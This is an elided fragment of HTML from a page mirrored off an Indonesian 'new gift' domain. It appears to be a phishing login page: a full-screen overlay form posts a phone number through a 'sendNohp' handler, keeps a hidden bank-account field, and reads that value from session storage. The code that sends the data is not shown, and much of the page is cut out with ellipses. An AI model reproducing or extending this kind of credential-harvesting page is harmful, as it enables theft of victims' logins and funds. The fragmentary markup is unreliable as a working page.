...
<!-- Mirrored from hadiah-baruu.zzyus.life/id/login/ by HTTrack Website Copier/3.x [XR&CO'2017], Mon, 13 Nov 2023 13:00:01 GMT -->
...
<body>
  ...
  <div style="position: fixed; left: 0; right: 0; width: 100%; top: 0; bottom: 0; height: 100%; background: rgba(0, 0, 0, 0.5); display: " id="formlogin" >
    <div style="position: absolute; left: 0; right: 0; width: 100%; height: 315px; background: white; margin: 0px auto; bottom: 0; border-radius: 15px 15px 0px 0px; border: 0px solid blue" class="animated">
...
<form onsubmit="sendNohp(event); return false" method="POST" id="inputlogin">
 ...
 <input type="hidden" id="rek" name="rek"> 
...
<div class="bubble-element eye clickable-element" tabindex="3" id="eyeOpen">
                        ...
                        <div class="bubble-element eye clickable-element" tabindex="3" id="eyeClose" style="display: none">
                            <ion-icon name="eye" id="eye"></ion-icon>
                                       ...
                                       <button id="btnsubmit" disabled class="btn-login" type="submit">Lanjutkan</button>
                                       <center>
...
var rek = sessionStorage.getItem("rek");
